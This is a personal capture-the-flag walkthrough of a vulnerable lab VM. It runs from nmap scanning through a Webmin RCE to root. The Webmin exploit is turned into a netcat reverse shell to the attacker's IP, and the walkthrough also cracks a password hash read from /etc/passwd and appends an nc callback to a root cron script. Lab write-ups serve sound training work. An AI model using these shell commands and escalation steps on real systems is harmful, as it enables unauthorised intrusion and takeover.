@@ -1,0 +1,96 @@
+ifconfig, myIP -> 192.168.56.125
+
+netdiscover -r 192.168.56.0/24 -i eth1
+
+targetIP -> 192.168.56.124
+
+nmap -sC -sV -A -T4 -p- 192.168.56.124
+	Host is up (0.00063s latency).
+	Not shown: 65532 closed ports
+	PORT      STATE SERVICE VERSION
+	22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 4b:f5:b3:ff:35:a8:c8:24:42:66:64:a4:4b:da:b0:16 (RSA)
+	|   256 2e:0d:6d:5b:dc:fe:25:cb:1b:a7:a0:93:20:3a:32:04 (ECDSA)
+	|_  256 bc:28:8b:e4:9e:8d:4c:c6:42:ab:0b:64:ea:8f:60:41 (ED25519)
+	80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+	|_http-server-header: Apache/2.4.29 (Ubuntu)
+	|_http-title: Welcome to my site! - nezuko kamado
+	13337/tcp open  http    MiniServ 1.920 (Webmin httpd)
+	| http-robots.txt: 1 disallowed entry 
+	|_/
+	|_http-title: Login to Webmin
+	MAC Address: 08:00:27:E1:A5:C7 (Oracle VirtualBox virtual NIC)
+	Device type: general purpose
+	Running: Linux 3.X|4.X
+	OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+	OS details: Linux 3.2 - 4.9
+	Network Distance: 1 hop
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+	TRACEROUTE
+	HOP RTT     ADDRESS
+	1   0.63 ms 192.168.56.124
+
+	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	# Nmap done at Wed Sep 18 19:36:05 2019 -- 1 IP address (1 host up) scanned in 48.36 seconds
+
+Ran Nikto + Dirb on 80, didn't give me much 
+	nikto -h 192.168.56.124
+	dirb http://192.168.56.124/
+
+Let's look at this 13337.
+	Going to https://192.168.56.125:13337 directs us to a Webmin login page. Try some basic default logins + sqli but to no avail
+
+searchsploit webmin 1.92
+	have an RCE for 1.92
+
+Read the script, see it's just echoing a flag. Let's change this to run a nc command instead to get a reverse shell:
+	d=id|nc -e /bin/bash 192.168.56.125 4444 &new
+
+Now start a listener on attacking machine:
+	nc -lvp 4444
+
+Run the script and boom, we have a user shell
+
+whoami -> nezuko
+ls
+cat nezuko.txt -> first flag!!
+
+let's see if we have python at all
+python --version -> nada
+python3 --verison -> python 3.6.7 yay
+python -c 'import pty; pty.spawn("/bin/bash")'
+	Now we have a bash shell, much easier to work with
+
+enumerating around nezuko's dir, we see messages being sent from zenitsu. Let's try to become zenitsu
+
+cat /etc/passwd
+	Reveals a hash for zenitsu!
+	zenitsu:$6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0
+
+throw that in a file and run john against it
+	john zenitsu.usr
+	john --show zenitsu.usr -> gives us zenitsu's password! (meowmeow)
+
+now in our reverse shell, lets change user to zenitsu since we have his password
+	su zenitsu
+	pw: meowmeow
+boom, we're in. second flag in zenitsu.txt! lets run the python script again to get bash.
+
+Ok so now we are zenitsu, but still can't get in admin. Let's enumerate through zenitsu
+
+Find a sh file called send_message_to_nezuko.sh
+if we run ll to see privileges of the file, it executes as root. If we inspect the file, we see it's sending a message to nezuku. It seems like its running on a cron job since nezuko is getting a message
+every 5 minutes. So, let's append a reverse shell to the file and listen for it, and see after 5 minutes if we get a root shell!
+
+echo "nc 192.168.56.125 5555" >> send_message_to_nezuko.sh
+
+works, vi the sh file to verify. now wait
+
+make sure to start your listener on the attacking machine
+
+then boom, we get the shell, whoami -> root! BOOM.
+
+cat root.txt -> we win :)
+pretty weeb overall but eh, still a fun ctf. make sure to apt upgrade! my first searchsploit wasn't updated so didnt have the up to date exploit at first
